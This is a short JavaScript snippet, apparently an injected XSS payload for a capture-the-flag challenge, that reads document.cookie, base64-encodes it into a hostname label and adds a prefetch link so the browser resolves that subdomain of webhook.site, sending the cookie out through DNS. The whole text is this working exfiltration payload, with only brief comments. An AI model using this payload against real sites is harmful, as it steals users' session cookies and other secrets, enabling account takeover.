let flag = document.cookie;
// We encode the flag into a valid subdomain string (removing = and {})
let safeFlag = btoa(flag).replace(/=/g, '').toLowerCase();

// Inject a DNS prefetch link into the head of the document
let link = document.createElement('link');
link.rel = 'prefetch';
// Point it to your webhook using DNS resolution
link.href = 'http://' + safeFlag + '.webhook.site';
document.head.appendChild(link);
